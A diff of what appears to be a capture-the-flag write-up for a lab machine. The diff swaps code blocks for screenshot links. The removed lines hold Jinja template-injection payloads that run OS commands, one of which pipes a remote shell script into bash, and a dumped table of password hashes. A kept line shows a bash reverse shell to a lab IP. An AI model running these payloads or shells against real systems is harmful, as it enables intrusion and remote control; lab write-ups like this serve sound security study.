@@ -96,18 +96,7 @@ available databases [2]:
 
 - Dump all these things
 
-```js
-+----+---------+---------------------+----------------------------------+
-| id | name    | email               | password                         |
-+----+---------+---------------------+----------------------------------+
-| 1  | admin   | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
-| 2  | test    | test@test.com       | 098f6bcd4621d373cade4e832627b4f6 |
-| 3  | {{8*8}} | {{7*7}}@gmail.com   | f2750fc6d623392c1c8ad1d9d18f7ea5 |
-| 4  | {{8*8}} | one@gmail.com       | f2750fc6d623392c1c8ad1d9d18f7ea5 |
-| 5  | {{8*8}} | two@gmail.com       | 098f6bcd4621d373cade4e832627b4f6 |
-| 6  | {{8*8}} | {{8*8}}@gmail.com   | 098f6bcd4621d373cade4e832627b4f6 |
-+----+---------+---------------------+----------------------------------+
-```
+![](https://i.imgur.com/TatSWpu.png)
 
 - only the first one is in the box, other 5 accounts are mine, used to check ssti
 - let's crack the hash `2b22337f218b2d82dfc3b6f77e7cb8ec`
@@ -138,9 +127,8 @@ available databases [2]:
 
 - In settings pannel we can able to do a SSTI
 
-```python
-{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() }}
-```
+![](https://i.imgur.com/MVc0N0x.png)
+
 
 ![](https://i.imgur.com/ndI9WbM.png)
 
@@ -152,9 +140,7 @@ available databases [2]:
 bash -c 'exec bash -i &>/dev/tcp/10.10.14.3/1337 <&1' 
 ```
 
-```python
-{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("curl 10.10.16.9/shell.sh | bash").read() }}
-```
+![](https://i.imgur.com/i6j0QYy.png)
 
 ![](https://i.imgur.com/Ekeegqz.png)
 
